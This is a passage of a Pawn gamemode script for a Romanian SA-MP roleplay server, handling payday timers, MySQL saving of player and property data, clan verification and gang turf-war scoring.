	    	GetVehicleHealth(carid, health);
	    	if(health < 950.0)
	    	{
	    		if(GetPlayerState(x) == 2)
	    		{
	    	    	pnsmoney[x] = GetPlayerMoney(x);
                	SetTimerEx("AfterSpray", 3000, false, "i", x);
					return 1;
				}
			}
		}
		if(IsPlayerInRangeOfPoint(x,50.0,BizzInfo[51][bEntranceX],BizzInfo[51][bEntranceY],BizzInfo[51][bEntranceZ]))
		{
	    	if(EnterInModShop[x] > 0)
	    	{
	        	GivePlayerCash(x, -BizzInfo[51][bEntranceCost]);
				BizzInfo[51][bTill] += BizzInfo[51][bEntranceCost];
				new str[128];
				mysql_format(SQL,str,sizeof(str),"UPDATE `bizz` SET `Till`='%d' WHERE `ID`='51'",BizzInfo[51][bTill]);
				mysql_tquery(SQL,str,"","");
				format(string,sizeof(string),"~r~-%d$", BizzInfo[51][bEntranceCost]);
   				GameTextForPlayer(x, string, 5000, 1);
   				EnterInModShop[x] = 0;
				return 1;
			}
		}
		if(IsPlayerInRangeOfPoint(x,50.0,BizzInfo[38][bEntranceX],BizzInfo[38][bEntranceY],BizzInfo[38][bEntranceZ]))
		{
	    	if(EnterInModShop[x] > 0)
	    	{
	        	GivePlayerCash(x, -BizzInfo[38][bEntranceCost]);
				BizzInfo[38][bTill] += BizzInfo[38][bEntranceCost];
				new str[128];
				mysql_format(SQL,str,sizeof(str),"UPDATE `bizz` SET `Till`='%d' WHERE `ID`='38'",BizzInfo[38][bTill]);
				mysql_tquery(SQL,str,"","");
				format(string,sizeof(string),"~r~-%d$", BizzInfo[38][bEntranceCost]);
   				GameTextForPlayer(x, string, 5000, 1);
   				EnterInModShop[x] = 0;
				return 1;
			}
		}
		if(IsPlayerInRangeOfPoint(x,50.0,BizzInfo[39][bEntranceX],BizzInfo[39][bEntranceY],BizzInfo[39][bEntranceZ]))
		{
	    	if(EnterInModShop[x] > 0)
	    	{
	        	GivePlayerCash(x, -BizzInfo[39][bEntranceCost]);
				BizzInfo[39][bTill] += BizzInfo[39][bEntranceCost];
				new str[128];
				mysql_format(SQL,str,sizeof(str),"UPDATE `bizz` SET `Till`='%d' WHERE `ID`='39'",BizzInfo[39][bTill]);
				mysql_tquery(SQL,str,"","");
				format(string,sizeof(string),"~r~-%d$", BizzInfo[39][bEntranceCost]);
   				GameTextForPlayer(x, string, 5000, 1);
   				EnterInModShop[x] = 0;
				return 1;
			}
		}
	}
	return 1;
}
public SavePlayerData()
{
	savedatatimerr++;
	if(savedatatimerr >= 300)
	{
		foreach(Player, x)
		{
			OnPlayerDateUpdateX2(x);
			Update(x, pPayDayx);
			Update(x, pPayCheckx);
			Update(x, pFpunishx);
			Update(x, pConnectTimex);
			Update(x, pLawyerx);
			Update(x, pBank);
			Update(x, pCashx);
			Update(x, pRP);
			Update(x, pJailTimex);
			Update(x, pGPointsx);
			Update(x, pPremiumPointsx);
			Update(x, pLevelx);
			Update(x, pHTokenx);
		}
		LoadClanInfo();
		printf("SavePlayerData: All accounts have been saved.");
		savedatatimerr = 0;
	}
	synctimerr++;
	if(synctimerr >= 10)
	{
		new string[128],
			tmphour,
			tmpminute,
			tmpsecond,
			hour,
			minn,
			sec,
			da,
			mo,
			ye;
		gettime(hour,minn,sec);
		gettime(tmphour, tmpminute, tmpsecond);
		getdate(ye, mo, da);

		FixHour(tmphour);
		tmphour = shifthour;
		if(minn == 1)
		{
			if(paydayacordat > 0)
			{
                nopaydaybug();
			}
		}
		if(minn == 0 && paydayacordat < 1)
		{
			new mysqlinsert[1500];
			if(hour == 0)
			{
				for(new ora = 0; ora < 24; ora++)
				{
					mysql_format(SQL, mysqlinsert, sizeof(mysqlinsert), "UPDATE `conectariore` SET `ora%d`='0' WHERE `ID`='1'",ora);
					mysql_tquery(SQL, mysqlinsert, "", "");
				}
			}
			mysql_format(SQL, mysqlinsert, sizeof(mysqlinsert), "UPDATE `conectariore` SET `ora%d`='%d' WHERE `ID`='1'",hour,GetOnLinePlayers());
			mysql_tquery(SQL, mysqlinsert, "", "");
		    PayDay();
			format(string, sizeof(string), "SERVER: The time is now %d:00 hours",hour);
			BroadCast(COLOR_SERVER,string);
			//printf("SERVER: The time is now %d:00 hours",hour);
			ghour = tmphour;
			paydayacordat = 1;
			if(hour == 20)
			{
				for(new id; id < sizeof(ClanInfo); id++)
				{
					if(ClanInfo[id][cClanVerificat] == 2)
					{
						if(ClanInfo[id][cConectari] >= 10)
						{
							ClanInfo[id][cClanVerificat] = 1;
							new stringyy[1280];
							ClanInfo[id][cClanSlots] = 30;
							mysql_format(SQL, stringyy, sizeof(stringyy), "UPDATE `clans` SET `ClanVerificat`='1', `clanSlots`='30' WHERE `clanID`='%d'",id);
							mysql_tquery(SQL, stringyy, "", "");
							mysql_format(SQL, stringyy, sizeof(stringyy), "SELECT * FROM `users` WHERE `Clan`='%d' AND `CRank`='7'",id);
							new Cache: ownerclan = mysql_query(SQL, stringyy);
							new idjucator;
							for(new i, j = cache_get_row_count(); i != j; i ++)
							{
								idjucator = cache_get_field_content_int(i, "id");
							}
							cache_delete(ownerclan);
							mysql_format(SQL, stringyy, sizeof(stringyy), "INSERT INTO `emails` (`playerid`,`Message`) VALUES('%d','Clanul tau a fost verificat cu succes.\nClanul a fost extins automat.\nStatus Clan: Verificat.')",idjucator);
							mysql_tquery(SQL, stringyy,"","");
						}
						else
						{
							ClanInfo[id][cClanVerificat] = 0;
							new stringyy[1280];
							mysql_format(SQL, stringyy, sizeof(stringyy), "UPDATE `clans` SET `ClanVerificat`='0' WHERE `clanID`='%d'",id);
							mysql_tquery(SQL, stringyy, "", "");
							mysql_format(SQL, stringyy, sizeof(stringyy), "SELECT * FROM `users` WHERE `Clan`='%d' AND `CRank`='7'",id);
							new Cache: ownerclan = mysql_query(SQL, stringyy);
							new idjucator;
							for(new i, j = cache_get_row_count(); i != j; i ++)
							{
								idjucator = cache_get_field_content_int(i, "id");
							}
							cache_delete(ownerclan);
							mysql_format(SQL, stringyy, sizeof(stringyy), "INSERT INTO `emails` (`playerid`,`Message`) VALUES('%d','Clanul tau a fost verificat cu succes.\nClanul a fost respins deoarece sunt prea putini jucatorii activi.\nStatus Clan: Neverificat.')",idjucator);
							mysql_tquery(SQL, stringyy,"","");
						}
					}
				}
			}
		    if(hour == 22)
		    {
	        	mysql_tquery(SQL,"UPDATE users SET FactionTime = FactionTime+1 WHERE Member > 0","","");
	        	foreach(Player, i)
	        	{
					PlayerInfo[i][pFactionTime] += 1;
				}
				mysql_tquery(SQL,"UPDATE users SET ClanTime = ClanTime+1 WHERE Clan > 0","","");
			}
			/*if(hour == 23)
			{
				new oferta = 1 + random(14);
				if(oferta == 1 || oferta == 3 || oferta == 6 || oferta == 9) ofertazilei = 1;
				if(oferta == 2 || oferta == 4 || oferta == 5 || oferta == 7) ofertazilei = 2;
				if(oferta == 8 || oferta == 10 || oferta == 11 || oferta == 12) ofertazilei = 3;
				if(oferta == 13 || oferta == 14 || oferta == 15) ofertazilei = 4;
				for(new x = 0; x < MAX_PLAYERS; x++)
				{
					if(IsPlayerConnected(x))
					{
						PlayerInfo[x][pDailyBonus] = 1;
						if(ofertazilei == 1) SCM(x, COLOR_SERVER, "{0066FF}Oferta zilei: {FFFFFF}Acumuleaza 5 PayDay-uri in aceasta zi."),
						SCM(x, COLOR_SERVER, "{0066FF}Premiu: {FFFFFF}150 de Puncte Premium, 10 Puncte de Respect, $25,000,000");
						if(ofertazilei == 2) SCM(x, COLOR_SERVER, "{0066FF}Oferta zilei: {FFFFFF}Ofera unui jucator de nivel (3-5) suma de $100,000 prin /pay."),
						SCM(x, COLOR_SERVER, "{0066FF}Premiu: {FFFFFF}30 de Puncte Premium, 5 Puncte de Respect, $5,000,000");
						if(ofertazilei == 3) SCM(x, COLOR_SERVER, "{0066FF}Oferta zilei: {FFFFFF}Castiga $100,000 la jobul Muncitor in Cariera."),
						SCM(x, COLOR_SERVER, "{0066FF}Premiu: {FFFFFF}60 de Puncte Premium, 7 Puncte de Respect, $8,000,000");
						if(ofertazilei == 4) SCM(x, COLOR_SERVER, "{0066FF}Oferta zilei: {FFFFFF}Acumuleaza 8 PayDay-uri in aceasta zi."),
						SCM(x, COLOR_SERVER, "{0066FF}Premiu: {FFFFFF}300 de Puncte Premium, 15 Puncte de Respect, $40,000,000");
						PlayerInfo[x][pDailyPayDay] = 0;
					}	
				}
				new sqlupdate[1000];
				mysql_format(SQL, sqlupdate, sizeof(sqlupdate), "UPDATE `users` SET `DailyBonus`='1',`DailyPayDay`='0' WHERE `id` > '0'");
				mysql_tquery(SQL, sqlupdate, "","");
				mysql_format(SQL, sqlupdate, sizeof(sqlupdate), "UPDATE `ofertezilnice` SET `ofertazilnica`='%d' WHERE `id` = '1'",ofertazilei);
				mysql_tquery(SQL, sqlupdate, "","");
			}*/
			if(hour == 23 && minn == 59 && GetWeekDay() == 7)
			{
			    mysql_tquery(SQL,"UPDATE `users` SET `Runners` = '0'","","");
			    mysql_tquery(SQL,"UPDATE `users` SET `Arrests` = '0'","","");
			    mysql_tquery(SQL,"UPDATE `users` SET `Tickets` = '0'","","");
			    mysql_tquery(SQL,"UPDATE `users` SET `DConfiscate` = '0'","","");
			    mysql_tquery(SQL,"UPDATE `users` SET `DLonfiscate` = '0'","","");
			    mysql_tquery(SQL,"UPDATE `users` SET `Contracts` = '0'","","");
			    mysql_tquery(SQL,"UPDATE `users` SET `News` = '0'","","");
			    mysql_tquery(SQL,"UPDATE `users` SET `Live` = '0'","","");
			    mysql_tquery(SQL,"UPDATE `users` SET `Orders` = '0'","","");
			    mysql_tquery(SQL,"UPDATE `users` SET `DDeposit` = '0'","","");
			    mysql_tquery(SQL,"UPDATE `users` SET `MDeposit` = '0'","","");
			    mysql_tquery(SQL,"UPDATE `users` SET `MUsed` = '0'","","");
			    mysql_tquery(SQL,"UPDATE `users` SET `WKills` = '0'","","");
			    mysql_tquery(SQL,"UPDATE `users` SET `WDeaths` = '0'","","");
			    mysql_tquery(SQL,"UPDATE `users` SET `LGiven` = '0'","","");
			    mysql_tquery(SQL,"UPDATE `users` SET `PHeals` = '0'","","");
			    //mysql_tquery(SQL,"UPDATE `users` SET `HelpedPlayers` = '0'","","");
			    //SendClientMessageToAll(COLOR_GREEN,"Toate raporatele factiunilor au fost resetate automat.");
			}
			if(hour == 23)
			{
				new str[1000];
				new strcache[1000];
				mysql_tquery(SQL, "UPDATE `sms_telefon` SET ZileStergere=ZileStergere+1 WHERE `ID` > '0'", "", "");
				mysql_tquery(SQL, "DELETE FROM `sms_telefon` WHERE `ZileStergere` > 2", "", "");
				mysql_tquery(SQL, "UPDATE `bizz` SET PropInactiv=PropInactiv+1 WHERE `ID` > 0 AND Owned > 0", "", "");
				mysql_format(SQL, strcache, sizeof(strcache), "SELECT * FROM `bizz` WHERE `PropInactiv` > '6' AND `ID` > '0'");
				new Cache: cachebiz = mysql_query(SQL, strcache);
				if(cache_get_row_count() > 0)
				{
					for(new i, j = cache_get_row_count(); i != j; i++)
					{
						new idbiz = cache_get_field_content_int(i, "ID");
						BizzInfo[idbiz][bLocked] = 0;
						BizzInfo[idbiz][bOwned] = 0;
						strmid(BizzInfo[idbiz][bOwner], "The State", 0, strlen("The State"), 255);
						mysql_format(SQL,str,sizeof(str),"UPDATE `bizz` SET `Locked`='0',`Owned`='0',`PropInactiv`='0',`Owner`='The State' WHERE `ID`='%d'",idbiz);
						mysql_tquery(SQL,str,"","");
						OnPropTextdrawUpdate(2, idbiz);
					}
					format(MGLOBAL, sizeof(MGLOBAL), "(( AdmBot says: They were removed %d Business for sale because their owners were inactive for seven days. ))",cache_get_row_count());
					SendClientMessageToAll(COLOR_GENANNOUNCE, MGLOBAL);
				}
				cache_delete(cachebiz);
				mysql_tquery(SQL, "UPDATE `houses` SET PropInactiv=PropInactiv+1 WHERE `ID` > 0 AND Owned > 0", "", "");
				mysql_format(SQL, strcache, sizeof(strcache), "SELECT * FROM `houses` WHERE `PropInactiv` > '6' AND `ID` > '0'");
				new Cache: cachecase = mysql_query(SQL, strcache);
				if(cache_get_row_count() > 0)
				{
					for(new i, j = cache_get_row_count(); i != j; i++)
					{
						new idcasa = cache_get_field_content_int(i, "ID");
						HouseInfo[idcasa][hOwned] = 0;
						format(HouseInfo[idcasa][hOwner], 100, "The State");
						format(HouseInfo[idcasa][hDiscription], 100, "Magic-Gaming.tk");
						HouseInfo[idcasa][hValue] = 30000000;
						OnPropTextdrawUpdate(1, idcasa);
						new str2[1000];
						mysql_format(SQL,str2,sizeof(str2),"UPDATE `houses` SET `Owned`='0',`PropInactiv`='0',`Owner`='The State', `Value`='30000000', `Discription`='Magic-Gaming.tk' WHERE `ID`='%d'", idcasa);
						mysql_tquery(SQL,str2,"","");
						mysql_format(SQL, str2, sizeof(str2),"UPDATE `users` SET `House`='999' WHERE `House`='%d'",idcasa);
						mysql_tquery(SQL, str2, "", "");
						mysql_format(SQL, str2, sizeof(str2),"UPDATE `users` SET `House2`='999' WHERE `House2`='%d'",idcasa);
						mysql_tquery(SQL, str2, "", "");
					}
					format(MGLOBAL, sizeof(MGLOBAL), "(( AdmBot says: They were removed %d houses for sale because their owners were inactive for 7 days. ))",cache_get_row_count());
					SendClientMessageToAll(COLOR_GENANNOUNCE, MGLOBAL);
				}
				cache_delete(cachecase);
				mysql_tquery(SQL,"UPDATE cars SET days = days+1","","");
				foreach(Player,i)
			    {
			        if(PlayerInfo[i][pPcarkey] != 0)
	 				{
	 	                CarInfo[PlayerInfo[i][pPcarkey]][cDays]++;
	 				}
	 				if(PlayerInfo[i][pmotokey] != 0)
	 				{
	                    CarInfo[PlayerInfo[i][pmotokey]][cDays]++;
	 				}
	 				if(PlayerInfo[i][pprcarkey] != 0)
	 				{
	                    CarInfo[PlayerInfo[i][pprcarkey]][cDays]++;
	 				}
	 				if(PlayerInfo[i][pprcarkey2] != 0)
	 				{
	                    CarInfo[PlayerInfo[i][pprcarkey2]][cDays]++;
		 			}
	 				if(PlayerInfo[i][pPPluscarkey] != 0)
	 				{
		                CarInfo[PlayerInfo[i][pPPluscarkey]][cDays]++;
	 				}
	 				if(PlayerInfo[i][pPPluscarkey2] != 0)
	 				{
			            CarInfo[PlayerInfo[i][pPPluscarkey2]][cDays]++;
	 				}
	 				if(PlayerInfo[i][pCarkey7] != 0)
	 				{
			            CarInfo[PlayerInfo[i][pCarkey7]][cDays]++;
	 				}
	 				if(PlayerInfo[i][pCarkey7] != 0)
	 				{
			            CarInfo[PlayerInfo[i][pCarkey7]][cDays]++;
	 				}
	 				if(PlayerInfo[i][pCarkey8] != 0)
	 				{
			            CarInfo[PlayerInfo[i][pCarkey8]][cDays]++;
	 				}
	 				if(PlayerInfo[i][pCarkey9] != 0)
	 				{
			            CarInfo[PlayerInfo[i][pCarkey9]][cDays]++;
	 				}
				}
				mysql_tquery(SQL,"UPDATE `users` SET `OnlineToday` = '0', `InregistratAzi`='0'","","");
				foreach(Player, i)
				{
					if(IsPlayerConnected(i))
					{
						mysql_format(SQL,str,sizeof(str),"UPDATE `users` SET `OnlineToday` = '1' WHERE `name`='%s'",PlayerInfo[i][pNormalName]);
						mysql_tquery(SQL,str,"","");
					}
				}
			}
			if(da == 28)
			{
				mysql_tquery(SQL,"UPDATE `users` SET `dm` = '0', `dmp` = '0'","","");
			}
			if(GetWeekDay() == 2 && hour == 23)
			{
				new str[1000];
				mysql_format(SQL,str,sizeof(str),"UPDATE `users` SET `OnlineLastWeek` = '1', `OnlineThisWeek` = '0' WHERE `OnlineThisWeek`='1'");
				mysql_tquery(SQL,str,"","");
				foreach(Player, i)
				{
					if(IsPlayerConnected(i))
					{
						mysql_format(SQL,str,sizeof(str),"UPDATE `users` SET `OnlineThisWeek` = '1' WHERE `name`='%s'",PlayerInfo[i][pNormalName]);
						mysql_tquery(SQL,str,"","");
					}
				}
				new rezultat[255];
				new nume[60];
				new sqlidjucator;
				mysql_format(SQL, str, sizeof(str), "SELECT * FROM `users` WHERE `OnlineHourWeek` > 0 ORDER BY OnlineHourWeek DESC LIMIT 1");
				new Cache: celmaiactiv = mysql_query(SQL, str);
				for(new i, j = cache_get_row_count(); i != j; i++)
				{
					cache_get_field_content(i, "name",rezultat); format(nume, sizeof(nume), rezultat);
					sqlidjucator = cache_get_field_content_int(i, "id");
				}
				cache_delete(celmaiactiv);
				new pprandom = 50 + random(50);
				new rprandom = 5 + random(20);
				new hiddenrandom = 5 + random(5);
				mysql_format(SQL, str, sizeof(str), "UPDATE `celmaiactivjucator` SET `nume`='%s',`premiupp`='%d',`premiurp`='%d',`premiuhidden`='%d' WHERE `id`='1'", nume, pprandom, rprandom, hiddenrandom);
				mysql_tquery(SQL, str, "", "");
				new gasit = 0;
				for(new i = 0; i < MAX_PLAYERS; i++)
				{
					if(IsPlayerConnected(i))
					{
						if(PlayerInfo[i][pSQLID] == sqlidjucator)
						{
							gasit = i;
						}
					}
				}
				if(gasit > 0)
				{
					PlayerInfo[gasit][pPremiumPoints] += pprandom;
					PlayerInfo[gasit][pExp] += rprandom;
					PlayerInfo[gasit][pHiddenColor] += hiddenrandom;
					Update(gasit, pPremiumPointsx);
					Update(gasit, pRP);
					Update(gasit, pHiddenColorx);
				}
				mysql_format(SQL, str, sizeof(str), "UPDATE `users` SET `PremiumPoints`=PremiumPoints+%d, `Respect`=Respect+%d, `HiddenColor`=HiddenColor+%d WHERE `id`='%d'",pprandom,rprandom,hiddenrandom,sqlidjucator);
				mysql_tquery(SQL, str, "","");
				mysql_format(SQL, str, sizeof(str), "INSERT INTO `emails` (`playerid`, `Message`) VALUES ('%d','Eveniment (/activity) - Serverul te-a ales pe tine ca fiind cel mai activ jucator al saptamanii.\nAi primit urmatoarele bonusurii:\n\%d Puncte Premium\n%d Puncte de Respect\n%d Culori Hidden')",sqlidjucator,pprandom,rprandom,hiddenrandom);
				mysql_tquery(SQL, str, "", "");
				new mesaj[512];
				format(mesaj, sizeof(mesaj), "{0066FF}Event {FFFFFF}({0066FF}/activity{FFFFFF}): The most active player of the week was chosen, it is: {0066FF}%s",nume);
				SendClientMessageToAll(COLOR_WHITE, mesaj);
				mysql_format(SQL, str, sizeof(str), "UPDATE `users` SET `OnlineHourWeek`='0' WHERE `ID` > 0");
				mysql_tquery(SQL, str, "","");
			}
			if (realtime)
			{
				SetWorldTimeEx(hour);
			}
		}
		synctimerr = 0;
		printf("SyncUp - executed after 10 sec");
	}
	return 1;
}
public PlayerMapIconPaint(playerid)
{
	foreach(Player,iss)
	{
		if(PlayerInfo[iss][pPaintBallG] == PlayerInfo[playerid][pPaintBallG])
		{
			if(playerid != iss)
			{
				SetPlayerMarkerForPlayer( playerid, iss, GetPlayerColor( iss ) );
				SetPlayerMarkerForPlayer( iss, playerid, GetPlayerColor( playerid ) );
			}
		}
	}
	return 1;
}
public DeleteDeathMessage(playerid)
{
	if(InWar[PlayerInfo[playerid][pMember]] != 1)
	{
		for (new i = 0; i != 5; ++i) SendDeathMessageToPlayer(playerid, 1001, 1001, 1001);
		KillTimer(deathdeletetime[playerid]);
	}
	else
	{
		KillTimer(deathdeletetime[playerid]);
	}
	return 1;
}
public SetPlayerUnjail()
{
    if(serverrestart2 > 0)
    {
		serverrestart2 = serverrestart2-1;
		new stringers[256];
		format(stringers, sizeof(stringers), "The server will restart in %d SECONDS", serverrestart2);
		TextDrawSetString(textile, stringers);
		foreach(Player,i)
		{
			TextDrawShowForPlayer(i, textile);
		}
		if(serverrestart2 < 1)
		{
		    foreach(Player,i)
			{
				OnPlayerDateUpdateX2(i);
				Update(i, pPayDayx);
				Update(i, pPayCheckx);
				Update(i, pFpunishx);
				Update(i, pConnectTimex);
				Update(i, pLawyerx);
				Update(i, pBank);
				Update(i, pCashx);
				Update(i, pRP);
				Update(i, pJailTimex);
				Update(i, pLevelx);
			}
   			serverrestart2 = -1;
   			SendRconCommand("changemode TOPZONE");
		}
	}
	new string[256],stringg[256];
	for(new i = 1; i < sizeof(Turfs); i++)
	{
		new attackers = WarInfo[i][wAttacker],
			defenders = WarInfo[i][wFaction],
			count=0,
			warid,
			var100[500];
		if(WarInfo[i][wTime] > 0)
		{
			WarInfo[i][wTime]--;
			foreach(Player,j)
			{
				if(gPlayerLogged[j] > 0)
				{
					if(PlayerInfo[j][pMember] == defenders || PlayerInfo[j][pMember] == attackers)
					{
						format(string, sizeof(string), "DURATA_RAZBOI:_~R~%s",CalculeazaTimp2(WarInfo[i][wTime]));
						PlayerTextDrawSetString(j, WarTD[5], string);
						format(string, sizeof(string), "%s_VS_%s",NumeFactiune(WarInfo[i][wAttacker]), NumeFactiune(WarInfo[i][wFaction]));
						PlayerTextDrawSetString(j, WarTD[1], string);
						format(string, sizeof(string), "DECESE_PERSONALE:_%d",decese[j][i]);
						PlayerTextDrawSetString(j, WarTD[2], string);
						format(string, sizeof(string), "UCIDERI_PERSONALE:_%d",ucideri[j][i]);
						PlayerTextDrawSetString(j, WarTD[3], string);
						new conduce1 = 0;
						new conduce2 = 0;
						new ucideri1 = 0, decese1 = 0, ucideri2 = 0, decese2 = 0;
						foreach(Player, x)
						{
							if(PlayerInfo[x][pMember] == attackers)
							{
								conduce1 += ucideri[x][i]-decese[x][i];
								ucideri1 += ucideri[x][i];
								decese1 += decese[x][i];
							}
							if(PlayerInfo[x][pMember] == defenders)
							{
								conduce2 += ucideri[x][i]-decese[x][i];
								ucideri2 += ucideri[x][i];
								decese2 += decese[x][i];
							}
						}
						if(conduce1 > conduce2)
						{
							format(string, sizeof(string), "%s_(%d_/_%d)_>_%s_(%d_/_%d)",NumeFactiune(WarInfo[i][wAttacker]),ucideri1,decese1, NumeFactiune(WarInfo[i][wFaction]), ucideri2, decese2);
							PlayerTextDrawSetString(j, WarTD[4], string);
						}
						if(conduce2 > conduce1)
						{
							format(string, sizeof(string), "%s_(%d_/_%d)_>_%s_(%d_/_%d)",NumeFactiune(WarInfo[i][wFaction]), ucideri2, decese2, NumeFactiune(WarInfo[i][wAttacker]), ucideri1, decese1);
							PlayerTextDrawSetString(j, WarTD[4], string);
						}
						if(conduce1 == conduce2)
						{
							format(string, sizeof(string), "%s_(%d_/_%d)_=_%s_(%d_/_%d)",NumeFactiune(WarInfo[i][wAttacker]), ucideri1, decese1, NumeFactiune(WarInfo[i][wFaction]), ucideri2, decese2);
							PlayerTextDrawSetString(j, WarTD[4], string);
						}
						if(boxawar[j] < 1){ boxawar[j] = 1; for(new xa = 0; xa < sizeof(WarTD); xa++) { PlayerTextDrawShow(j, WarTD[xa]); } }
						else { for(new xa = 1; xa < sizeof(WarTD); xa++) { PlayerTextDrawShow(j, WarTD[xa]); } }
					}	
				}	
			}
			if(WarInfo[i][wTime] == 1)
			{
				new atscore = 0,
					defscore = 0,
					winner;
				atscore = WarScoreF[attackers][i];
				defscore = WarScoreF[defenders][i];
				foreach(Player,j)
				{
					if(PlayerInfo[j][pMember] == attackers)
					{
						GangZoneStopFlashForPlayer(j,Turfs[i]);
					}
					if(PlayerInfo[j][pMember] == defenders)
					{
						GangZoneStopFlashForPlayer(j,Turfs[i]);
					}
				}
				if(atscore > defscore)
				{
					winner = 1;
				}
				else
				{
					winner = 2;
				}
				if(atscore == defscore)
				{
					winner = 2;
				}
				if(winner == 1)
				{
					new str[128],stringyy[MAX_STRING];
					format(var100, sizeof(var100),"INSERT INTO `wars` (`Attacker`,`Defender`,`Atscore`,`Defscore`,`Result`) VALUES ('%d','%d','%d','%d','1')",attackers,defenders,atscore,defscore);
					mysql_query(SQL,var100);
					warid = mysql_insert_id();
					TurfInfo[i][zOwned] = WarInfo[i][wAttacker];
					mysql_format(SQL,str,128,"UPDATE `turfs` SET `Owned`='%d' WHERE `ID`='%d'",TurfInfo[i][zOwned],i);
					mysql_tquery(SQL,str,"","");
					format(stringyy, sizeof(stringyy), "NR AdmBot: gangs %s conquered territory #%d which was owned by mafia %s.",NumeFactiune(WarInfo[i][wAttacker]),i,NumeFactiune(WarInfo[i][wFaction]));
					OOCNews(COLOR_ORANGE,stringyy);
				}
				if(winner == 2)
				{
					new stringyy[MAX_STRING];
					format(var100, sizeof(var100),"INSERT INTO `wars` (`Attacker`,`Defender`,`Atscore`,`Defscore`,`Result`) VALUES ('%d','%d','%d','%d','2')",attackers,defenders,atscore,defscore);
					mysql_query(SQL,var100);
					warid = mysql_insert_id();
				    format(stringyy, sizeof(stringyy), "NR AdmBot: gangs %s defending territory #%d attacked by mob %s.",NumeFactiune(WarInfo[i][wFaction]),i,NumeFactiune(WarInfo[i][wAttacker]));
				    OOCNews(COLOR_ORANGE,stringyy);
				}
				format(stringg,sizeof(stringg),"------------ [ war overview #%d ] ------------", warid);
				SendFamilyMessage(attackers, COLOR_GREEN, stringg);
				SendFamilyMessage(defenders, COLOR_GREEN, stringg);
				if(winner == 1)
				{
					format(stringg,sizeof(stringg),"Score: %s %d - %d %s.",NumeFactiune(WarInfo[i][wAttacker]),atscore,defscore,NumeFactiune(WarInfo[i][wFaction]));
					SendFamilyMessage(attackers, COLOR_GREEN, stringg);
					SendFamilyMessage(defenders, COLOR_GREEN, stringg);
				}
				if(winner == 2)
				{
					format(stringg,sizeof(stringg),"Score: %s %d - %d %s.",NumeFactiune(WarInfo[i][wFaction]),defscore,atscore,NumeFactiune(WarInfo[i][wAttacker]));
					SendFamilyMessage(attackers, COLOR_GREEN, stringg);
					SendFamilyMessage(defenders, COLOR_GREEN, stringg);
				}
				new id = CalculateBestScore(i),
					id2 = CalculateWorstScore(i),
					bestnamee[30],
					worstnamee[30];
				GetPlayerName(id, bestnamee, sizeof(bestnamee));
				GetPlayerName(id2, worstnamee, sizeof(worstnamee));
				format(stringg,sizeof(stringg),"Best score: %s with a score of %d (%d kills, %d deaths). Worst score: %s with a score of %d (%d kills, %d deaths).", bestnamee, ucideri[id][i]-decese[id][i], ucideri[id][i], decese[id][i], worstnamee, ucideri[id2][i]-decese[id2][i], ucideri[id2][i], decese[id2][i]);
				SendFamilyMessage(attackers, COLOR_GREEN, stringg);
				SendFamilyMessage(defenders, COLOR_GREEN, stringg);
				foreach(Player, j)
				{
					if((PlayerInfo[j][pMember] == attackers) || (PlayerInfo[j][pMember] == defenders))
					{
						format(stringg,sizeof(stringg),"Your personal score: %d (%d kills, %d deaths).",ucideri[j][i]-decese[j][i],ucideri[j][i], decese[j][i]);
						SendClientMessage(j, COLOR_GREEN,stringg);
						for(new ix = 0; ix < sizeof(WarTD); ix++) { PlayerTextDrawHide(j, WarTD[ix]); }
						boxawar[j] = 0;
						for (new sss = 0; sss != 5; ++sss) SendDeathMessageToPlayer(j, 1001, 1001, 1001);
					}
				}
				SendFamilyMessage(attackers, COLOR_GREEN,"------------------------------------");
				SendFamilyMessage(defenders, COLOR_GREEN,"------------------------------------");
				WarScoreF[defenders][i] = 0;
				WarScoreF[attackers][i] = 0;
				InWar[attackers] = 0;
				InWar[defenders] = 0;
				waitwar[attackers] = 60;
				waitwar[defenders] = 60;
				for(new warobj = 0; warobj < 200; warobj++)
				{
					warobjj[warobj] = 0;
					DestroyPickup(warobjj[warobj]);
				}
				foreach(Player, j)
				{
					if((PlayerInfo[j][pMember] == attackers) || (PlayerInfo[j][pMember] == defenders))
					{
						SendClientMessage(j, COLOR_YELLOW, "You were transferred in the normal Virtual World (0).");
						if(GetPlayerInterior(j) < 1)
						{
							SetPlayerVirtualWorld(j, 0);
						}
						if(attackers == 4 || defenders == 4)
						{
							for(new veh; veh < sizeof(Aztecasc); veh++)
							{
								SetVehicleVirtualWorld(Aztecasc[veh], 0);
							}
						}
						if(attackers == 5 || defenders == 5)
						{
							for(new veh; veh < sizeof(Grovec); veh++)
							{
								SetVehicleVirtualWorld(Grovec[veh], 0);
							}
						}
						if(attackers == 6 || defenders == 6)
						{
							for(new veh; veh < sizeof(Vagosc); veh++)
							{
								SetVehicleVirtualWorld(Vagosc[veh], 0);
							}
						}
						if(attackers == 10 || defenders == 10)
						{
							for(new veh; veh < sizeof(Ballasc); veh++)
							{
								SetVehicleVirtualWorld(Ballasc[veh], 0);
							}
						}
						mysql_format(SQL, var100, sizeof(var100),"INSERT INTO `warlogs` (`PlayerID`,`WarID`,`Kills`,`Deaths`,`Faction`) VALUES ('%d','%d','%d','%d','%d')",PlayerInfo[j][pSQLID],warid,ucideri[j][i],decese[j][i],PlayerInfo[j][pMember]);
						mysql_tquery(SQL,var100,"","");
						ucideri[j][i] = 0;
						decese[j][i] = 0;
					}
				}
				if(winner == 1)
				{
					foreach(Player, j)
					{
						if(TurfsDisp[j] == 1)
						{
							GangZoneHideForPlayerEx(j,Turfs[i]);
							if(attackers == 4)
							{
								GangZoneShowForPlayerEx(j,Turfs[i],0xCC000099);
							}
							if(attackers == 5)
							{
								GangZoneShowForPlayerEx(j,Turfs[i],0x40863CAA);
							}
							if(attackers == 6)
							{
								GangZoneShowForPlayerEx(j,Turfs[i],0x2F2F2F99);
							}
							if(attackers == 10)
							{
								GangZoneShowForPlayerEx(j,Turfs[i],0x88572499);
							}
						}
					}
					DeelayWar[WarInfo[i][wFaction]] = 600;
					DeelayWar[WarInfo[i][wAttacker]] = 600;
				}
				if(winner == 2)
				{
					DeelayWar[WarInfo[i][wFaction]] = 600;
					DeelayWar[WarInfo[i][wAttacker]] = 600;
				}
				WarInfo[i][wTime] = 0;
				WarInfo[i][wFaction] = 0;
				WarInfo[i][wAttacker] = 0;
				worstscoreat[i] = 0;
				worstmemberat[i] = 999;
				bestscoreat[i] = 0;
				bestmemberat[i] = 999;
				worstscoredf[i] = 0;
				worstmemberdf[i] = 999;
				bestscoredf[i] = 0;
				bestmemberdf[i] = 999;
			}
			if(WarInfo[i][wTime] > 2)
			{
				foreach(Player,j)
				{
					if(IsPlayerInTurf(j, i))
					{
